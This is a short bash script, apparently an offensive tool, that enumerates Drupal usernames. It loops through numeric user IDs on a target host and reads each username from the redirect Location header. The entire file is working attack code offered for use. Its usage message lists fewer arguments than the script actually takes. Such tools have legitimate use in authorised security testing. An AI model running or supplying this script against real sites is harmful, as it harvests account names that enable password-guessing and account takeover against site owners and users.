#!/bin/bash

echo -e "Drupal User Enumeration By Redirect - Developed by sknux\n"

i=$2

if [ -z "$1" ]
then
	echo -e "Usage: $0 Initial-Number-of-Attempts Final-Number-of-Attempts\nExample: $0 URL/IP 10 500."
	exit
fi

while [ $i -le $3 ]
do
	echo 'The user of ID' $i 'is:'
	curl -s --head https://$1/user/$i -k | grep Location | cut -d ' ' -f2 | cut -d '/' -f5
	((i++))
done
